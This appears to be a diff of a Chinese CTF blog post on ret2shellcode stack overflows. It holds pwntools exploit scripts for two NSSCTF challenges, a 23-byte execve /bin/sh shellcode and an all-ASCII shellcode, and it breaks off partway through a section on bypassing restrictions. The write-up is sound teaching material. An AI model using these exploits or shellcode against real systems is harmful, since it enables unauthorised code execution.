@@ -1,221 +1,126 @@
-<!DOCTYPE html>
-<html lang="en, zh-CN">
+<!DOCTYPE HTML>
+<html>
 <head>
   <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="referrer" content="no-referrer">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>PWN练习之ret2shellcode | D&#39;b8Gr的小站~</title>
+  <meta name="author" content="debu8ger">
+  
+  <meta name="description" content="h3llo_w0rld">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-<title>PWN练习之ret2shellcode | D&#39;b8Gr的小站~</title>
+  <meta property="og:title" content="PWN练习之ret2shellcode"/>
+  <meta property="og:site_name" content="D&#39;b8Gr的小站~"/>
 
+  
+    <meta property="og:image" content=""/>
+  
 
-<meta name="description" content="h3llo_w0rld">
+  
+    <link rel="alternative" href="/atom.xml" title="D&#39;b8Gr的小站~" type="application/atom+xml">
+  
+  
+    <link href="//static/avatar/avatar.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
 
+  <script src="/js/jquery-2.0.3.min.js"></script>
 
-<meta name="author" content="debu8ger">
-
-
-
-<!-- Canonical -->
-<link rel="canonical" href="">
-
-<!-- Favicon -->
-<link rel="icon" href="../../../../images/favicon.ico">
-
-<!-- RSS -->
-
-<link rel="alternate" type="application/rss+xml" title="D&#39;b8Gr的小站~" href="../../../../atom.xml">
-
-
-<!-- Open Graph -->
-<meta property="og:type" content="article">
-<meta property="og:title" content="PWN练习之ret2shellcode">
-<meta property="og:url" content="">
-<meta property="og:site_name" content="D&#39;b8Gr的小站~">
-
-<meta property="og:description" content="h3llo_w0rld">
-
-
-<!-- Twitter Card -->
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PWN练习之ret2shellcode">
-
-<meta name="twitter:description" content="h3llo_w0rld">
-
-
-<!-- Theme Color -->
-<meta name="theme-color" content="#1d1f21">
-<meta name="msapplication-TileColor" content="#1d1f21">
-
-<!-- Stylesheets -->
-
-<link rel="stylesheet" href="../../../../css/style.css">
+  <!-- analytics -->
+  
 
 
-<!-- Custom Layout Variables -->
-
-<style>
-:root {
-  --page-width: 80rem;
-  --content-width: 950px;
-  --mobile-padding: 12px;
-}
-</style>
-
-<!-- Analytics -->
-
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-133464311-1"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-  gtag('config', 'UA-133464311-1');
-</script>
 
 
 <meta name="generator" content="Hexo 7.3.0"></head>
-<body class="theme-dark">
-  <div class="container">
-    <header class="header">
-  <div class="header-inner">
-    <div class="header-brand">
-      
-        <a href="../../../../index.html" class="logo">
-          <img src="../../../../static/avatar/avatar1.png"
-               width="100"
-               height="100"
-               alt="D&#39;b8Gr的小站~">
-        </a>
-      
-      <a href="../../../../index.html" class="site-title">
-        D&#39;b8Gr的小站~
-      </a>
-    </div>
 
-    <nav class="nav">
-      <button class="nav-toggle" id="nav-toggle" aria-label="Toggle navigation">
-        <span class="nav-toggle-bar"></span>
-        <span class="nav-toggle-bar"></span>
-        <span class="nav-toggle-bar"></span>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
       </button>
-
-      <ul class="nav-menu" id="nav-menu">
-        
-          
-          
-            
-            <li class="nav-item">
-              <a href="../../../../index.html"
-                 class="nav-link"
-                 >
-                主页
-              </a>
-            </li>
-            
-              <li class="nav-divider">|</li>
-            
-          
-            
-            <li class="nav-item">
-              <a href="../../../../about/"
-                 class="nav-link"
-                 >
-                关于我
-              </a>
-            </li>
-            
-              <li class="nav-divider">|</li>
-            
-          
-            
-            <li class="nav-item">
-              <a href="../../../../archives/"
-                 class="nav-link"
-                 >
-                归档
-              </a>
-            </li>
-            
-              <li class="nav-divider">|</li>
-            
-          
-            
-            <li class="nav-item">
-              <a href="../../../../atom.xml"
-                 class="nav-link"
-                 >
-                RSS
-              </a>
-            </li>
-            
-              <li class="nav-divider">|</li>
-            
-          
-            
-            <li class="nav-item">
-              <a href="../../../../categories/"
-                 class="nav-link"
-                 >
-                分类
-              </a>
-            </li>
-            
-          
-        
-      </ul>
-    </nav>
-  </div>
-</header>
-
-
-    <main class="main">
-      
-        <div class="page-layout">
-          <article class="post">
-  <header class="post-header">
-  <h1 class="post-title">PWN练习之ret2shellcode</h1>
-
-  <div class="post-meta">
-    <span class="meta-item">
-      <svg viewBox="0 0 24 24" width="14" height="14"><path fill="currentColor" d="M19 4h-1V2h-2v2H8V2H6v2H5c-1.11 0-1.99.9-1.99 2L3 20c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V9h14v11zM9 11H7v2h2v-2zm4 0h-2v2h2v-2zm4 0h-2v2h2v-2z"/></svg>
-      <time datetime="2025-11-05">
-        2025-11-05
-      </time>
-    </span>
-
-    
-      <span class="meta-item">
-        <svg viewBox="0 0 24 24" width="14" height="14"><path fill="currentColor" d="M21 10.12h-6.78l2.74-2.82c-2.73-2.7-7.15-2.8-9.88-.1-2.73 2.71-2.73 7.08 0 9.79s7.15 2.71 9.88 0C18.32 15.65 19 14.08 19 12.1h2c0 1.98-.88 4.55-2.64 6.29-3.51 3.48-9.21 3.48-12.72 0-3.5-3.47-3.53-9.11-.02-12.58s9.14-3.47 12.65 0L21 3v7.12z"/></svg>
-        <time datetime="2026-03-11">
-          Updated on 2026-03-11
-        </time>
-      </span>
-    
-
-    
-      <span class="meta-item">
-        <svg viewBox="0 0 24 24" width="14" height="14"><path fill="currentColor" d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>
-        
-          <a href="../../../../categories/CTF%E7%9B%B8%E5%85%B3/">CTF相关</a>
-        
-      </span>
-    
-  </div>
-</header>
-
-
-  
-    <nav class="toc">
-  <h3 class="toc-title">Table of Contents</h3>
-  <div class="toc-list">
-    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E8%83%BD%E7%9A%84exp%E5%A7%BF%E5%8A%BF"><span class="toc-text">可能的exp姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%B3%A8%E5%85%A5shellcode%E8%87%B3stack%E6%AE%B5%E4%B8%AD"><span class="toc-text">1.注入shellcode至stack段中</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%B3%A8%E5%85%A5shellcode%E8%87%B3bss%E6%AE%B5%E4%B8%AD"><span class="toc-text">2.注入shellcode至bss段中</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80-GDOUCTF-2023-Shellcode"><span class="toc-text">一.[GDOUCTF 2023]Shellcode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C-HNCTF-2022-Week1-safe-shellcode"><span class="toc-text">二.[HNCTF 2022 Week1]safe_shellcode</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6"><span class="toc-text">绕过限制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80-%E9%99%90%E5%88%B6%E8%BE%93%E5%85%A5%E9%95%BF%E5%BA%A6"><span class="toc-text">一.限制输入长度</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C-%E9%99%90%E5%88%B6%E6%9D%83%E9%99%90"><span class="toc-text">二.限制权限</span></a></li></ol></li></ol>
-  </div>
+	  <a class="navbar-brand" href="/">D&#39;b8Gr的小站~</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="所有文章">
+			  <i class="fa fa-archive"></i>归档
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="所有分类">
+			  <i class="fa fa-folder"></i>分类
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="所有标签">
+			  <i class="fa fa-tags"></i>标签
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>关于我
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
 </nav>
+<div class="clearfix"></div>
 
-  
+  <div class="container">
+  	<div class="content">
+    	 
 
-  <div class="post-content">
-  <h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>ret2shellcode是栈溢出利用<code>ret2text</code>、<code>ret2shellcode</code>、<code>ret2libc</code>三大类中的一个，是指攻击者需要在程序没给shell的情况下自己调用<code>shell</code>的机器码(即<code>shellcode</code>)注入到程序内存中，随后就是利用栈溢出复写<code>return_address</code>，跳转至<code>shellcode所在内存</code>，执行shell命令，得到flag。</p>
+
+	
+		<div class="page-header">
+			<h1> PWN练习之ret2shellcode</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>ret2shellcode是栈溢出利用<code>ret2text</code>、<code>ret2shellcode</code>、<code>ret2libc</code>三大类中的一个，是指攻击者需要在程序没给shell的情况下自己调用<code>shell</code>的机器码(即<code>shellcode</code>)注入到程序内存中，随后就是利用栈溢出复写<code>return_address</code>，跳转至<code>shellcode所在内存</code>，执行shell命令，得到flag。</p>
 <h3 id="可能的exp姿势"><a href="#可能的exp姿势" class="headerlink" title="可能的exp姿势"></a>可能的exp姿势</h3><h4 id="1-注入shellcode至stack段中"><a href="#1-注入shellcode至stack段中" class="headerlink" title="1.注入shellcode至stack段中"></a>1.注入shellcode至stack段中</h4><p>这个现在其实很少见了，基本上都加了保护。其中，比较常见的保护手段有：</p>
 <ul>
 <li><strong>ASLR</strong>：其功能是将一部分内存段(如栈…)的地址<code>偏移</code>，在注入时难以定位其位置。</li>
@@ -227,14 +132,14 @@
 <p><img src="/images/pwn1.png" alt="pwn1"></p>
 <p>加了<strong>NX</strong>，不过没啥关系，</p>
 <p>放到IDA中反编译，定位到<code>main函数</code>：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">10</span>]; <span class="comment">// [rsp+6h] [rbp-Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setbuf</span>(stdin, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stderr, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">mprotect</span>((<span class="type">void</span> *)((<span class="type">unsigned</span> __int64)&amp;stdout &amp; <span class="number">0xFFFFFFFFFFFFF000LL</span>), <span class="number">0x1000uLL</span>, <span class="number">7</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please.&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;name, <span class="number">0x25uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Nice to meet you.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s start!&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x40uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">10</span>]; <span class="comment">// [rsp+6h] [rbp-Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setbuf</span>(stdin, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stderr, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">mprotect</span>((<span class="type">void</span> *)((<span class="type">unsigned</span> __int64)&amp;stdout &amp; <span class="number">0xFFFFFFFFFFFFF000LL</span>), <span class="number">0x1000uLL</span>, <span class="number">7</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please.&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;name, <span class="number">0x25uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Nice to meet you.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s start!&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x40uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>可以利用<code>name</code>来注入shellcode，然后再栈溢出到<code>buf</code>中执行。这里要注意的是<code>name</code>限制了<code>25字节</code>的写入。</p>
 <p>想到利用<code>pwntools</code>里的<code>shellcraft</code>模块直接生成<code>shellcode</code>利用，</p>
 <p>首先试试用<code>shellcraft.sh()</code>，但是这个在32位下占位44字节，64位的则为<code>48字节</code>，超过了25字节的写入限制。于是，便利用<code>shellcraft.cat()</code>来构造<code>cat flag</code>，这个只有0x21字节。</p>
 <p>接着，我们得到<code>name</code>的地址为<code>.bss段</code>的<code>0x6010A0</code>。</p>
 <p>最后的exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28409</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.cat(<span class="string">&quot;flag&quot;</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please.&#x27;</span>, shellcode)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;start!&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x12</span> + p64(<span class="number">0x6010A0</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag:NSSCTF&#123;d7640236-bc9b-4954-a10a-2bfd305e91a8&#125;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28409</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.cat(<span class="string">&quot;flag&quot;</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please.&#x27;</span>, shellcode)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;start!&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x12</span> + p64(<span class="number">0x6010A0</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag:NSSCTF&#123;d7640236-bc9b-4954-a10a-2bfd305e91a8&#125;</span></span><br></pre></td></tr></table></figure>
 
 <p>还有一种做法是<strong>手动构造shellcode</strong>，找一个小于25字节的shellcode。</p>
 <blockquote>
@@ -245,7 +150,7 @@
 <p>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f \x05</p>
 </blockquote>
 <p>其余的基本上不变，下面为第二种exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28409</span>)</span><br><span class="line">shellcode = <span class="string">&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please.&#x27;</span>, shellcode)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;start!&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x12</span> + p64(<span class="number">0x6010A0</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag:NSSCTF&#123;d7640236-bc9b-4954-a10a-2bfd305e91a8&#125;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28409</span>)</span><br><span class="line">shellcode = <span class="string">&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please.&#x27;</span>, shellcode)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;start!&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x12</span> + p64(<span class="number">0x6010A0</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag:NSSCTF&#123;d7640236-bc9b-4954-a10a-2bfd305e91a8&#125;</span></span><br></pre></td></tr></table></figure>
 
 
 
@@ -253,7 +158,7 @@
 <p><img src="/images/pwn2.png" alt="pwn2"></p>
 <p>保护得还算少，</p>
 <p>IDA中反编译，定位<code>main函数</code>：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">524</span>]; <span class="comment">// [rsp+0h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+20Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setbuf</span>(stdin, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stderr, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">mprotect</span>((<span class="type">void</span> *)((<span class="type">unsigned</span> __int64)&amp;stdout &amp; <span class="number">0xFFFFFFFFFFFFF000LL</span>), <span class="number">0x1000uLL</span>, <span class="number">7</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x200uLL</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, s, <span class="number">0x300uLL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[i] &lt;= <span class="number">47</span> || s[i] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Hacker!!!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(buff, s);</span><br><span class="line">  (*(<span class="built_in">void</span> (**)(<span class="type">void</span>))buff)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">524</span>]; <span class="comment">// [rsp+0h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+20Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setbuf</span>(stdin, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stderr, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">mprotect</span>((<span class="type">void</span> *)((<span class="type">unsigned</span> __int64)&amp;stdout &amp; <span class="number">0xFFFFFFFFFFFFF000LL</span>), <span class="number">0x1000uLL</span>, <span class="number">7</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x200uLL</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, s, <span class="number">0x300uLL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt;= <span class="built_in">strlen</span>(s) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[i] &lt;= <span class="number">47</span> || s[i] &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Hacker!!!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(buff, s);</span><br><span class="line">  (*(<span class="built_in">void</span> (**)(<span class="type">void</span>))buff)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>就是先<code>read</code>一下<code>s</code>变量，循环<code>s</code>字节数的次数做判断，<code>strcpy(buff, s)</code>则是将<code>s</code>的值直接存入<code>buff</code>中，其也指向了<code>.bss段</code>。</p>
 <p>要想绕过该判断，只要输入的ascii码在47-122之间即可。0<del>9、A</del>Z、a~z都可。</p>
@@ -269,37 +174,37 @@
 <p> 64位 纯ascii字符shellcode Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t </p>
 </blockquote>
 <p>最后的exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>, <span class="number">26988</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span></span><br><span class="line">io.send(shellcode)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag:nssctf&#123;W0www!!!!!!!!!!!Sh311C0d3_m@st3rrr!!&#125;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>, <span class="number">26988</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span></span><br><span class="line">io.send(shellcode)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag:nssctf&#123;W0www!!!!!!!!!!!Sh311C0d3_m@st3rrr!!&#125;</span></span><br></pre></td></tr></table></figure>
 
 
 
 <h3 id="绕过限制"><a href="#绕过限制" class="headerlink" title="绕过限制"></a>绕过限制</h3><h4 id="一-限制输入长度"><a href="#一-限制输入长度" class="headerlink" title="一.限制输入长度"></a>一.限制输入长度</h4><ol>
 <li><p><strong>利用短字节shellcode(32位)</strong></p>
 <p><code>getshell</code> - 21字节</p>
